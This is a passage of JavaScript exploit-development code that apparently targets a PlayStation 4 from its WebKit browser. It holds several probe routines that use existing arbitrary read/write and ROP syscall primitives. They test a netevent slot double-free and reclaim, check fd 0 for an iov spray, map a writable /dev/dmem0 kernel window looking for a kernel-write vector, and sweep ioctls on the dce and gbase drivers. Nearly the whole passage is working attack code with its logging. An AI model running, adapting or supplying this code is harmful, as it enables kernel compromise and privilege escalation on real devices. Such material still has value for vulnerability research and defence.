            const su2 = sc(SYS.setuid, 1).i32;
            ASM("setuid#2 rv=" + su2);
            const cr = neteventSlot(-1, s2, NETEVENT_CLEAR_QUEUE);
            ASM("CLR(-1,S2) rv=" + cr.rv + " err=" + cr.err);
            const s3 = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
            const rv3 = neteventSlot(-1, s3, NETEVENT_SET_QUEUE);
            ASM("SET(-1,S3) rv=" + rv3.rv + " err=" + rv3.err
                + " SLOT-FREED=" + (rv3.rv === 0 ? "YES" : "NO"));
            if (s2 > 0) sc(SYS.close, s2);
            if (s3 > 0) sc(SYS.close, s3);
            neteventSlot(-1, s3, NETEVENT_CLEAR_QUEUE);
            mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
            return;
        }

        // ?probe=fd0         -- is fd 0 a socket in this sandbox? The reference
        // (netctrl.js:443, rawgame chain_poops.js:853) spends the pre-double-free
        // iov/uio spray as sendmsg(0,msg,0) x0x80. In the browser/rawgame
        // process fd 0 IS a socket. The old NULL-cell (msg=0) was NOT
        // discriminating: FreeBSD sys_sendmsg copyin's the msghdr BEFORE the
        // fget/SO_TYPE check, so sendmsg(fd,0,0) returns EFAULT(14) no matter
        // what fd is. The decisive cells below send a REAL msghdr -- the exact
        // chain_poops shape (iov[0]={base=1,len=1}, iovlen=23, the "ref" replica)
        // and a clean shape (23 valid data pointers) -- on fd 0, a fresh AF_UNIX
        // socket and a socketpair:
        //   rv>=0              -> connected socket, iov array fully consumed
        //   errno=57 ENOTCONN  -> unconnected socket, iov array WAS allocated
        //   errno=14 EFAULT(clean) -> not a socket / device refusing the parse
        //   errno=88 ENOTSOCK / 9 EBADF -> not a socket
        // Combined with getsockopt(0,SO_TYPE) (real pointers, not NULL) this
        // reads out in one shot.
        if (params.get("probe") === "fd0") {
            const FD0 = d => mark("FZERO", d);
            const E = { 0: "OK", 9: "EBADF", 14: "EFAULT", 22: "EINVAL",
                        32: "EPIPE", 57: "ENOTCONN", 88: "ENOTSOCK" };
            const ename = e => E[e] != null ? E[e] : "errno" + e;
            const msgAb = new ArrayBuffer(MSGHDR_SIZE); keepAlive.push(msgAb);
            const msgDv = new DataView(msgAb), msgAddr = bufAddr(msgAb);
            const iovAb = new ArrayBuffer(IOVEC_SIZE * NUM_MSG_IOV); keepAlive.push(iovAb);
            const iovDv = new DataView(iovAb), iovAddr = bufAddr(iovAb);
            const dataAb = new ArrayBuffer(0x200); keepAlive.push(dataAb);
            const dataAddr = bufAddr(dataAb);
            const fdAb = new ArrayBuffer(8); keepAlive.push(fdAb);
            const fdv = new DataView(fdAb), fdAddr = bufAddr(fdAb);

            const buildMsg = mode => {
                new Uint8Array(msgAb).fill(0);
                if (mode === "clean") {
                    for (let k = 0; k < NUM_MSG_IOV; ++k) {
                        put(iovDv, 0x10 * k, dataAddr);
                        put(iovDv, 0x10 * k + 8, 0x10);
                    }
                } else {
                    new Uint8Array(iovAb).fill(0);
                    put(iovDv, 0, 1);
                    put(iovDv, 8, 1);
                }
                put(msgDv, 0x10, iovAddr);
                msgDv.setInt32(0x18, NUM_MSG_IOV, true);
                return msgAddr;
            };
            const trySend = (fd, label) => {
                const r = sc(SYS.sendmsg, fd, buildMsg("ref"), 0).i32;
                const er = errno();
                const r2 = sc(SYS.sendmsg, fd, buildMsg("clean"), 0).i32;
                const er2 = errno();
                FD0(label + " ref(23iov base=1) rv=" + r + " " + ename(er)
                    + " | clean(23iov valid) rv=" + r2 + " " + ename(er2));
                return { er, er2 };
            };

            FD0("sendmsg on fd 0 -- reference reclaim primitive");
            const r0 = sc(SYS.sendmsg, 0, 0, 0).i32;
            FD0("fd0 sendmsg(NULL) rv=" + r0 + " " + ename(errno())
                + " (msg-copyin fault; proves nothing about fd0)");
            const f0 = sc(SYS.fcntl, 0, 1, 0).i32;
            FD0("fcntl(0,F_GETFD) rv=" + f0 + " " + ename(errno()));
            fdv.setUint32(0, 4, true);
            const g0 = sc(SYS.getsockopt, 0, 0xffff, 0x3, fdAddr.add32(8), fdAddr).i32;
            FD0("getsockopt(0,SO_TYPE) rv=" + g0 + " " + ename(errno())
                + " type=" + fdv.getUint32(8, true));

            const d0 = trySend(0, "fd0[0]");
            const n0 = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
            FD0("fresh AF_UNIX fd=" + n0);
            const sp = [0, 0];
            const rsp = sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, fdAddr).i32;
            if (rsp === 0) { sp[0] = fdv.getInt32(0, true); sp[1] = fdv.getInt32(4, true); }
            FD0("socketpair rv=" + rsp + " " + ename(errno()) + " fds=" + sp[0] + "/" + sp[1]);
            const np = rsp === 0 ? trySend(sp[0], "sockpair[" + sp[0] + "]") : null;
            const nf = n0 > 0 ? trySend(n0, "fresh[" + n0 + "]") : null;

            const notSock = e => e === 88 || e === 9;
            const fd0Sock = !(notSock(d0.er) && notSock(d0.er2) && g0 === -1);
            if (fd0Sock) fd0IsSocket = 1;
            FD0("RESULT fd0_is_socket=" + (fd0Sock ? 1 : 0)
                + " ref=" + ename(d0.er) + " clean=" + ename(d0.er2)
                + " (controls: fresh=" + (nf ? ename(nf.er) + "/" + ename(nf.er2) : "n/a")
                + " pair=" + (np ? ename(np.er) + "/" + ename(np.er2) : "n/a") + ")");
            FD0("reclaim-primitive " + (fd0Sock
                ? "USABLE on fd0" : "NOT usable on fd0 (spraySockpair fallback required)"));
            if (rsp === 0) { sc(SYS.close, sp[0]); sc(SYS.close, sp[1]); }
            if (n0 > 0) sc(SYS.close, n0);
            mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
            return;
        }

        // ?probe=mu       -- matrix on slot 1 (forced): does setuid(1)x2 change
        // whether CLR frees the slot? EXP2 (no setuid) freed; attemptshape
        // (slot -1 + setuid) did not. Two confounders are entangled: slot
        // (-1 auto vs 1 forced) AND setuid presence. This disambiguates on the
        // FORCED slot where both reproductions are clean.
        if (params.get("probe") === "mu") {
            const MM = d => mark("MATX", d);
            const tryClr = (slot, fd) => neteventSlot(slot, fd, NETEVENT_CLEAR_QUEUE);
            const sh = (label, slot, fd) => {
                const s0 = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
                const rs = neteventSlot(slot, s0, NETEVENT_SET_QUEUE);
                MM(label + " SET(" + slot + ", fd" + s0 + ") rv=" + rs.rv + " err=" + rs.err);
                sc(SYS.close, s0);
                const s1 = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
                MM(label + " reclaim fd=" + s1 + " expect=" + s0
                    + (s1 === s0 ? "" : " MISMATCH"));
                const cr = tryClr(slot, s1);
                MM(label + " CLR(" + slot + ") rv=" + cr.rv + " err=" + cr.err);
                const s2 = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
                const r2 = neteventSlot(slot, s2, NETEVENT_SET_QUEUE);
                MM(label + " SET-again(" + slot + ") rv=" + r2.rv + " err=" + r2.err
                    + " FREED=" + (r2.rv === 0 ? "YES" : "NO"));
                tryClr(slot, s2);
                if (s1 > 0) sc(SYS.close, s1);
                if (s2 > 0) sc(SYS.close, s2);
            };
            MM("A: slot=1 NO setuid (EXP2 control)");
            sh("A", 1, 0);
            MM("B: slot=1 WITH setuid x2 (attemptshape control)");
            const sB0 = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
            const rsB = neteventSlot(1, sB0, NETEVENT_SET_QUEUE);
            MM("B SET(1, fd" + sB0 + ") rv=" + rsB.rv + " err=" + rsB.err);
            sc(SYS.close, sB0);
            const sB1 = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
            MM("B reclaim fd=" + sB1 + " expect=" + sB0
                + (sB1 === sB0 ? "" : " MISMATCH"));
            MM("B setuid#1 rv=" + sc(SYS.setuid, 1).i32);
            MM("B setuid#2 rv=" + sc(SYS.setuid, 1).i32);
            const crB = tryClr(1, sB1);
            MM("B CLR(1) rv=" + crB.rv + " err=" + crB.err);
            const sB2 = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
            const rB2 = neteventSlot(1, sB2, NETEVENT_SET_QUEUE);
            MM("B SET-again(1) rv=" + rB2.rv + " err=" + rB2.err
                + " FREED=" + (rB2.rv === 0 ? "YES" : "NO"));
            tryClr(1, sB2);
            if (sB1 > 0) sc(SYS.close, sB1);
            if (sB2 > 0) sc(SYS.close, sB2);
            mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
            return;
        }

        // ?probe=netevent  -- decisive: does NETEVENT_CLEAR_QUEUE release its
        // kernel slot (rv=-1 cosmetic) or is it sandbox-blocked? seq numbers
        // defeat the async /log shuffling so reconstruction is exact.
        if (params.get("probe") === "netevent") {
            let seq = 0;
            const PEM = d => mark("PNET", "#" + (++seq) + " " + d);
            const canSet = s => neteventSlot(-1, s, NETEVENT_SET_QUEUE);
            const canClr = (slot, s) => neteventSlot(slot, s, NETEVENT_CLEAR_QUEUE);
            PEM("EXP1 SET(-1,a)=>CLR(-1,a)=>SET(-1,b): if SET-b=0 then CLEAR freed slot");
            const a = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
            PEM("EXP1 sock-a fd=" + a);
            const r1 = canSet(a);
            PEM("SET-a rv=" + r1.rv + " err=" + r1.err);
            const c1 = canClr(-1, a);
            PEM("CLR-a rv=" + c1.rv + " err=" + c1.err);
            const b = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
            const r2 = canSet(b);
            PEM("SET-b rv=" + r2.rv + " err=" + r2.err + " DECIDE1-slot-1-freed="
                + (r2.rv === 0 ? "YES" : "NO"));
            canClr(-1, b);
            sc(SYS.close, a); sc(SYS.close, b);

            PEM("EXP2 (slot 1, independent) SET(1,s0)=>close=>reclaim=>CLR(1,s1)=>SET(1,s2)");
            const s0 = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
            const rs0 = neteventSlot(1, s0, NETEVENT_SET_QUEUE);
            PEM("SET(1,s0) rv=" + rs0.rv + " err=" + rs0.err);
            sc(SYS.close, s0);
            const s1 = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
            PEM("reclaimed fd=" + s1 + " expect=" + s0);
            const c2 = canClr(1, s1);
            PEM("CLR(1,s1) rv=" + c2.rv + " err=" + c2.err);
            const s2 = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
            const r3 = neteventSlot(1, s2, NETEVENT_SET_QUEUE);
            PEM("SET(1,s2) rv=" + r3.rv + " err=" + r3.err + " DECIDE2-slot-1-freed="
                + (r3.rv === 0 ? "YES" : "NO"));
            canClr(1, s2);
            sc(SYS.close, s1); sc(SYS.close, s2);

            rebootRequired = true;
            mark("PROBE-DONE", "netevent conclusion = DECIDE1/DECIDE2 above; rebootNeeded=set");
            state("probe netevent done", "warn");
            mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
            return;
        }

        // ?probe=dmem -- ORIGINAL EARLY BROWSER PATH (2026-09-12). The game
        // probes proved libkernel-internal fd=5 (/dev/dmem0) bypasses the
        // game-sandbox ioctl filter: ioctl(0x80108002) re-arms a fixed 16MB
        // writable kernel-dmap window (p. 0x2ec48000) + ioctl 0x80288012
        // (direct_memory_query) leaked type/int at kernel. THE BROWSER DIFFERENCE:
        // the WebKit process sandbox is WIDER (netcontrol + IPV6_RTHDR both
        // work in-chain) and, critically, a rendering browser keeps the GPU
        // ACTIVE -- where the game's re-arm diff showed the DMA ring INERT
        // (0 changed qwords), a live browser ring may rotate the PM4/GCN
        // command buffer, giving an ORIGINAL kernel-write vector without any
        // cred swap. This probe: (1) open /dev/dmem0 fresh (r9f showed a fresh
        // open is re-usable, not one-shot), (2) ioctl re-arm sweep, (3) mmap
        // 16MB RW, (4) re-arm+remap DIFF to test ring liveness, (5) report the
        // canonical descriptor qwords (magic/self/dma) for the browser text.
        if (params.get("probe") === "dmem") {
            const DM = d => mark("DMEM", d);
            DM("start pid=" + sc(SYS.getpid).i32 + " uid=" + sc(SYS.getuid).i32);
            const O_RDWR = 2, O_RDONLY = 0;
            const PROT_RW = 3, MAP_SHARED = 0x1, MAP_PRIVATE = 0x2, MAP_FIXED = 0x10;
            const IOC_REARM = 0x80108002, IOC_QUERY = 0x80288012,
                  IOC_TYPE = 0xc0208004, IOC_LQ = 0x4010a802;
            const DMEM = "/dev/dmem0\0";
            const pathAb = new ArrayBuffer(64); keepAlive.push(pathAb);
            new Uint8Array(pathAb).set(DMEM.split("").map(c => c.charCodeAt(0)));
            const pathAddr = bufAddr(pathAb);
            const xorAb = new ArrayBuffer(0x40); keepAlive.push(xorAb);
            const xorAddr = bufAddr(xorAb), xorDv = new DataView(xorAb);
            // rearm struct: qw0 = 0x40000-aligned size ALIAS (game probe used
            // 0x100000/0x10000000/0x40000000/0x80000000/0x2ec48000 -> PASS),
            // qw1 = size (ignored by the fixed 16MB window).
            const RE_ALIGNED = [0x100000, 0x10000000, 0x2ec48000];
            const setStruct = (al = RE_ALIGNED[0], sz = 0x100000) => {
                xorDv.setUint32(0, al, true);
                xorDv.setUint32(4, 0, true);
                xorDv.setUint32(8, sz, true);
                xorDv.setUint32(12, 0, true);
            };
            setStruct();
            // (a) fresh open /dev/dmem0 from the browser context
            const fd = sc(SYS.open, pathAddr, O_RDWR, 0).i32;
            DM("open(/dev/dmem0, RDWR) fd=" + fd + " err="
                + (fd === -1 ? errno() : 0));
            let useFd = fd;
            if (useFd <= 0) {
                const fd2 = sc(SYS.open, pathAddr, O_RDONLY, 0).i32;
                DM("open(RDONLY) fd=" + fd2 + " err="
                    + (fd2 === -1 ? errno() : 0));
                if (fd2 > 0) useFd = fd2;
            }
            // toggle: game probes found the real dmem0 fd cached in libkernel
            // globals at libk+0x58038+8 (dword 5 in-game). Browser has its OWN
            // fd table (5/6/7 are NOT dmem0 here -- ioctl ENOTTY), so we read
            // the TRUE cached fd from libkernel globals via arbitrary read.
            const gcand = [];
            const gBase = libkernelBase.add32(0x58038);
            for (let g = 0; g < 0x40 && gcand.length < 16; g += 4) {
                const fdv = p.read4(gBase.add32(g));
                if (fdv > 0 && fdv < 0x1000) gcand.push(fdv);
            }
            DM("libk-global fds@0x58038: " + gcand.join(","));
            const internalFds = [useFd, ...gcand, 5, 6, 7, 8, 9]
                .filter(v => v > 0);
            DM("trying fds: " + [...new Set(internalFds)].join(","));
            let mapped = null, mappedFd = 0, lastArmedFd = 0;
            const seen = new Set();
            const qwHex = (dv, o) => "0x"
                + (dv.getUint32(o + 4, true) >>> 0).toString(16).padStart(8, "0")
                + (dv.getUint32(o, true) >>> 0).toString(16).padStart(8, "0");
            for (const tfd of internalFds) {
                if (seen.has(tfd)) continue; seen.add(tfd);
                setStruct();
                const rR = sc(SYS.ioctl, tfd, IOC_REARM, xorAddr, 0, 0, 0).i32;
                DM("ioc rearm fd=" + tfd + " rv=" + rR + " err="
                    + (rR === -1 ? errno() : 0));
                if (rR !== 0) continue;
                lastArmedFd = tfd;
                setStruct();
                const rQ = sc(SYS.ioctl, tfd, IOC_QUERY, xorAddr, 0, 0, 0).i32;
                DM("ioc query fd=" + tfd + " rv=" + rQ + " err="
                    + (rQ === -1 ? errno() : 0) + " qw0="
                    + xorDv.getUint32(0, true) + " qw1=" + xorDv.getUint32(8, true)
                    + " qw2=" + xorDv.getUint32(16, true));
                // mmap the re-armed 16MB RW window (MAP_SHARED; W^X strips EXEC)
                const m = sc(SYS.mmap, 0, 0x1000000, PROT_RW, MAP_SHARED, tfd, 0);
                const mHI = m.hi, mLO = m.lo;
                const mOK = mHI !== 0xFFFFFFFF && mHI !== 0 && mHI < 0x8000;
                const maddr = new int64(mLO, mHI);
                DM("mmap fd=" + tfd + " addr=" + (mOK ? "0x"
                    + maddr.hi.toString(16) + maddr.low.toString(16)
                    : "FAIL err=" + errno() + " lo=0x" + mLO.toString(16)
                        + " hi=0x" + mHI.toString(16)));
                if (mOK) { mapped = maddr; mappedFd = tfd; break; }
            }
            if (!mapped) {
                // NOTE: calling libkernel's inner /dev/dmem0 opener @0x18210
                // via callAddr ROP HANGS the renderer (17:15:01, no return) and
                // starves the heap on retry -> PS4 "insufficient free space".
                // callAddr ROP only works for syscall STUBS (all sc()); C fns
                // need native.fcall-style arg/stack setup which the browser
                // path lacks. Skipped intentionally.
                {
                    // Level 3: mmap blocked -> try read/write directly on the
                    // re-armed fd (cheap, no C-function calls).
                    const rfd = lastArmedFd || useFd;
                    DM("rwfb lastArmedFd=" + lastArmedFd + " useFd=" + useFd);
                setStruct();   // zero the 0x40 buffer
                const rvR = sc(SYS.read, rfd, xorAddr, 0x40, 0, 0, 0).i32;
                DM("read() fd=" + rfd + " rv=" + rvR + " err="
                    + (rvR === -1 ? errno() : 0) + " qw0="
                    + qwHex(xorDv, 0) + " qw1=" + qwHex(xorDv, 8)
                    + " qw2=" + qwHex(xorDv, 16) + " qw3=" + qwHex(xorDv, 24));
                // try a write probe on same fd: 0xABC dword at +0x20
                xorDv.setUint32(0x20, 0xABCD0000, true);
                const rvW = sc(SYS.write, rfd, xorAddr, 0x40, 0, 0, 0).i32;
                DM("write() fd=" + rfd + " rv=" + rvW + " err="
                    + (rvW === -1 ? errno() : 0));
                // PREAD missing from SYS; read() again after re-arm -- the
                // re-armed device read cursor may expose window start.
                const rvR2 = sc(SYS.read, rfd, xorAddr, 0x40, 0, 0, 0).i32;
                DM("read2() fd=" + rfd + " rv=" + rvR2 + " err="
                    + (rvR2 === -1 ? errno() : 0) + " qw0="
                    + qwHex(xorDv, 0) + " qw1=" + qwHex(xorDv, 8));
                    mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
                    return;
                }   // end else (level-3 read/write fallback)
            }
            DM("MAPPED fd=" + mappedFd + " via " + (mappedFd === useFd
                ? "fresh open" : "libkernel-global/fallback"));
            const qw = off => {
                const v = p.read8(mapped.add32(off));
                return "0x" + v.hi.toString(16) + v.low.toString(16);
            };
            DM("WIN magic+0x00=" + qw(0x00) + " +0x08=" + qw(0x08)
                + " +0x10=" + qw(0x10) + " +0x18=" + qw(0x18)
                + " +0x20=" + qw(0x20) + " self-vs-dmap=" + qw(0x18));
            DM("WIN gpu@+0x30=" + qw(0x30) + " +0x38=" + qw(0x38)
                + " +0x40=" + qw(0x40) + " +0x48=" + qw(0x48)
                + " +0x50=" + qw(0x50) + " +0x58=" + qw(0x58)
                + " +0x60=" + qw(0x60) + " +0x68=" + qw(0x68)
                + " +0x70=" + qw(0x70) + " +0x78=" + qw(0x78));
            DM("WIN dmapbase@+0x310=" + qw(0x310) + " +0x318=" + qw(0x318)
                + " +0x3d8=" + qw(0x3d8) + " ring0=" + qw(0x800)
                + " ring1=" + qw(0x820) + " ring2=" + qw(0x840));
            // LIVENESS: persist markers, re-arm + re-map, diff fixed offsets.
            for (const [at, val] of [[0x20, 0xabcd0000], [0x100, 0x12345678]]) {
                try { p.write8(mapped.add32(at), new int64(val, 0)); }
                catch (e) { DM("WRITE@0x" + at.toString(16) + " THREW " + e.message); }
            }
            const before = [];
            const RINGS = [[0, 0x200], [0x800, 0xc00], [0xe00, 0x1000], [0xf000, 0xf400]];
            for (const [lo, hi] of RINGS)
                for (let o = lo; o <= hi; o += 0x8)
                    before.push(p.read8(mapped.add32(o)).low);
            DM("rearm2...");
            setStruct();
            const rR2 = sc(SYS.ioctl, mappedFd, IOC_REARM, xorAddr, 0, 0, 0).i32;
            DM("ioc rearm#2 rv=" + rR2 + " err=" + (rR2 === -1 ? errno() : 0));
            const m2 = sc(SYS.mmap, 0, 0x1000000, PROT_RW, MAP_SHARED, mappedFd, 0);
            const m2OK = m2.hi !== 0xFFFFFFFF && m2.hi !== 0 && m2.hi < 0x8000;
            const afterMapped = m2OK ? new int64(m2.lo, m2.hi) : mapped;
            DM("mmap#2 " + (m2OK ? "addr=0x" + m2.hi.toString(16)
                + m2.lo.toString(16) + (m2OK && afterMapped.low !== mapped.low
                    ? " WINDOW-RELOCATED" : " SAME-ADDR")
                : "FAIL err=" + errno()));
            let changedLW = 0, diffSample = [];
            let bi = 0;
            for (const [lo, hi] of RINGS) {
                for (let o = lo; o <= hi; o += 0x8) {
                    const v = p.read8(afterMapped.add32(o));
                    if (v.low !== before[bi]) { changedLW++; if (diffSample.length < 8) diffSample.push("+0x" + o.toString(16)); }
                    bi++;
                }
            }
            DM("LIVENESS changed_qwords=" + changedLW + " of " + bi
                + " sample=" + diffSample.join(","));
            DM("CONCLUSION " + (changedLW === 0
                ? "RING-INERT (frozen GPU snapshot like game; browser may not consume)"
                : "RING-LIVE (browser GPU consumes ring -- kernel-write vector viable)"));
            if (useFd > 0) sc(SYS.close, useFd);
            mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
            return;
        }

        // ?probe=s434 -- deep single-number probe of sc#434 (2026-09-12).
        // Sweep run 434 FIRST each time and it always RETURNS a pointer-like
        // value that is stable across pids (18395584/18387584 = 0x118B040 /
        // 0x118A840 on pids 66/67, delta 0x1F40 = one 8KB page). Sc#435 did
        // not appear because the NEXT call afterwards hangs the renderer. This
        // probe calls 434 ONCE, treats rv as a pointer, dumps qwords there,
        // then calls it AGAIN to see if it is repeatable/stable.
        if (params.get("probe") === "s434") {
            const a434 = libkernelBase.add32(0x15d0);
            for (let k = 0; k < 2; ++k) {
                const rv = callAddr(a434, [0, 0, 0, 0, 0, 0]);
                mark("S434", "call#" + (k + 1) + " rv.lo=" + rv.lo
                    + " hi=" + rv.hi + " i32=" + rv.i32);
                if (k === 0 && rv.lo !== 0) {
                    const ptr = new int64(rv.lo, rv.hi);
                    // deep dump: qwords 0..0x180
                    let out = "ptr=0x" + rv.hi.toString(16) + rv.lo.toString(16);
                    for (let o = 0; o <= 0x180; o += 8) {
                        try {
                            const w = p.read8(ptr.add32(o));
                            out += " +0x" + o.toString(16) + "="
                                + w.hi.toString(16) + w.low.toString(16);
                        } catch (e) { out += " +0x" + o.toString(16) + "=ERR"; }
                    }
                    mark("S434-DEEP", out);
                    // follow the two userland pointers (q2/q4 area)
                    for (const po of [16, 32]) {
                        try {
                            const w = p.read8(ptr.add32(po));
                            const base = new int64(w.low, w.hi);
                            let dv = "p@+" + po + "=0x" + w.hi.toString(16)
                                + w.low.toString(16);
                            for (let o = 0; o < 0x40; o += 8) {
                                try {
                                    const v = p.read8(base.add32(o));
                                    dv += " +" + o.toString(16) + "="
                                        + v.hi.toString(16) + v.low.toString(16);
                                } catch (e) { dv += " +" + o.toString(16) + "=ERR"; }
                            }
                            mark("S434-FOLLOW", dv);
                        } catch (e) { mark("S434-FOLLOW", "p@+" + po + " ERR " + e.message); }
                    }
                }
            }
            mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
            return;
        }

        // ?probe=decioctl -- TARGETED DEVICE IOCTL BATTERY on the 3 browser-openable
        // devices (dmem0/dipsw/dce) using ioctl codes extracted from the
        // libkernel.bin openers (2026-09-12). dce is NEW surface (game denied
        // it 0x80020001, browser opens RDWR). All sc() calls, no callAddr.
        if (params.get("probe") === "decioctl") {
            const DI = d => mark("DEVIOCTL", d);
            DI("start pid=" + sc(SYS.getpid).i32 + " uid=" + sc(SYS.getuid).i32);
            const O_RDWR = 2, O_RDONLY = 0;
            const PROBE_IOCTLS = {
                "/dev/dmem0": [0x80108002,0x80288012,0xc0208004,0x80020016,
                    0x80108015,0x80108017,0x40188009,0x4010a802],
                "/dev/dipsw": [0x40048806,0x4008800a,0x80108002,0x80288012],
                "/dev/dce":   [0xc0308203,0xc0044507,0xc0044508,0xc0044511,
                    0x40084516,0x80020016,0x80020001]
            };
            const readCstrAddr = (s) => {
                const ab = new ArrayBuffer(s.length + 1);
                keepAlive.push(ab);
                const u8 = new Uint8Array(ab);
                for (let i = 0; i < s.length; ++i) u8[i] = s.charCodeAt(i);
                return bufAddr(ab);
            };
            const dstAb = new ArrayBuffer(0x100); keepAlive.push(dstAb);
            const dstAddr0 = bufAddr(dstAb), dstDv = new DataView(dstAb);
            for (const dev in PROBE_IOCTLS) {
                const pa = readCstrAddr(dev);
                let fd = sc(SYS.open, pa, O_RDWR, 0).i32;
                let mode = "RDWR";
                if (fd <= 0) { fd = sc(SYS.open, pa, O_RDONLY, 0).i32; mode = "RDONLY"; }
                if (fd <= 0) { DI(dev + " open-FAIL err=" + errno()); continue; }
                DI(dev + " fd=" + fd + " " + mode);
                for (let k = 0; k < PROBE_IOCTLS[dev].length; ++k) {
                    const cmd = PROBE_IOCTLS[dev][k];
                    // zero the dst buffer so kernel zero-fill is observable
                    for (let o = 0; o < 0x40; o += 4) dstDv.setUint32(o, 0, true);
                    const rv = sc(SYS.ioctl, fd, cmd, dstAddr0, 0, 0, 0).i32;
                    const err = rv === -1 ? errno() : 0;
                    // read back first 4 qwords
                    DI("  " + dev + " ioctl " + hx(cmd) + " rv=" + rv
                        + " err=" + err + " raw0=" + hx(dstDv.getUint32(0, true))
                        + " raw1=" + hx(dstDv.getUint32(8, true))
                        + " raw2=" + hx(dstDv.getUint32(16, true)));
                }
                sc(SYS.close, fd, 0, 0, 0, 0, 0);
            }
            DI("done");
            mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
            return;
        }

        // ?probe=dcedrv -- DCE DRIVER DEEP DIVE (2026-09-12). DEVIOCTL found the
        // ONLY unfiltered reachable driver: /dev/dce ioctl 0xc0308203 returns
        // EFAULT(14) (NOT sandbox EINVAL) meaning it reaches the real dce_video/
        // dce_control driver. libkernel opener @0x1dec8 builds struct{dword0=0x23,
        // rest zero @0x40} then ioctl; @0x1da60 opens O_RDONLY + ioctl 0x40084516
        // and reads a dword back (DCE register read). Replicate both exactly.
        if (params.get("probe") === "dcedrv") {
            const DC = d => mark("DCEDRV", d);
            DC("start pid=" + sc(SYS.getpid).i32 + " uid=" + sc(SYS.getuid).i32);
            const O_RDWR = 2, O_RDONLY = 0;
            const readCstrAddr = (s) => {
                const ab = new ArrayBuffer(s.length + 1);
                keepAlive.push(ab);
                const u8 = new Uint8Array(ab);
                for (let i = 0; i < s.length; ++i) u8[i] = s.charCodeAt(i);
                return bufAddr(ab);
            };
            const pa = readCstrAddr("/dev/dce");
            const mkBuf = () => {
                const ab = new ArrayBuffer(0x40); keepAlive.push(ab);
                const dv = new DataView(ab);
                for (let o = 0; o < 0x40; o += 4) dv.setUint32(o, 0, true);
                dv.setUint32(0, 0x23, true);
                return { ab, addr: bufAddr(ab), dv };
            };
            // A) opener replication: open RDWR, ioctl 0xc0308203 init
            {
                const fd = sc(SYS.open, pa, O_RDWR, 0).i32;
                const b = mkBuf();
                const rv = sc(SYS.ioctl, fd, 0xc0308203, b.addr, 0, 0, 0).i32;
                DC("A open-rdwr fd=" + fd + " ioctl init rv=" + rv + " err="
                    + (rv === -1 ? errno() : 0) + " out0=" + hx(b.dv.getUint32(0, true)));
                if (fd > 0) sc(SYS.close, fd, 0, 0, 0, 0, 0);
            }
            // B) register read: fresh O_RDONLY + ioctl 0x40084516 readback a dword
            for (let i = 0; i < 3; ++i) {
                const fd = sc(SYS.open, pa, O_RDONLY, 0).i32;
                const b = mkBuf();
                const rv = sc(SYS.ioctl, fd, 0x40084516, b.addr, 0, 0, 0).i32;
                DC("B" + i + " open-rdonly fd=" + fd + " ioctl 0x40084516 rv=" + rv
                    + " err=" + (rv === -1 ? errno() : 0)
                    + " out=" + hx(b.dv.getUint32(0, true)));
                if (fd > 0) sc(SYS.close, fd, 0, 0, 0, 0, 0);
            }
            // C) cmd-write sequence used by libkernel (0x1d44c+): values on dword0
            for (const cmd of [0x320, 0x2a2, 0x2c8, 0x390, 0x3d9, 0x834, 3]) {
                const fd = sc(SYS.open, pa, O_RDONLY, 0).i32;
                const b = mkBuf();
                b.dv.setUint32(0, cmd, true);
                const rv = sc(SYS.ioctl, fd, 0xc0044507, b.addr, 0, 0, 0).i32;
                DC("C ioctl 0xc0044507 val=0x" + cmd.toString(16) + " rv=" + rv
                    + " err=" + (rv === -1 ? errno() : 0)
                    + " out0=" + hx(b.dv.getUint32(0, true)));
                if (fd > 0) sc(SYS.close, fd, 0, 0, 0, 0, 0);
            }
            DC("done");
            mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
            return;
        }

        // ?probe=gbase2 -- GBASE (GPU) DRIVER SERIES (2026-09-12). RE of the
        // 0x1d400-0x1dc00 functions shows they open "/dev/gbase" (GPU base),
        // NOT /dev/dce. ioctl family r14=0xc0044507 then rsi=r14+2..+7 sweeps
        // 0xc0044509..0xc004450e (=Phone odd NRs) which we never probed. Values:
        // dword0=0x320,0x2a2,0x2c8,0x320,0x390,0x3d9,0x834 + 0x40084516 readb.
        if (params.get("probe") === "gbase2") {
            const GB = d => mark("GBASE2", d);
            GB("start pid=" + sc(SYS.getpid).i32 + " uid=" + sc(SYS.getuid).i32);
            const O_RDWR = 2, O_RDONLY = 0;
            const readCstrAddr = (s) => {
                const ab = new ArrayBuffer(s.length + 1);
                keepAlive.push(ab);
                const u8 = new Uint8Array(ab);
                for (let i = 0; i < s.length; ++i) u8[i] = s.charCodeAt(i);
                return bufAddr(ab);
            };
            // A) which driver answered 0xc0308203: probe BOTH /dev/gbase and /dev/dce
            for (const dev of ["/dev/gbase", "/dev/dce"]) {
                const pa = readCstrAddr(dev);
                const ab = new ArrayBuffer(0x40); keepAlive.push(ab);
                const dv = new DataView(ab);
                for (let o = 0; o < 0x40; o += 4) dv.setUint32(o, 0, true);
                dv.setUint32(0, 0x23, true);
                const fd = sc(SYS.open, pa, O_RDWR, 0).i32;
                const rv = sc(SYS.ioctl, fd, 0xc0308203, bufAddr(ab), 0, 0, 0).i32;
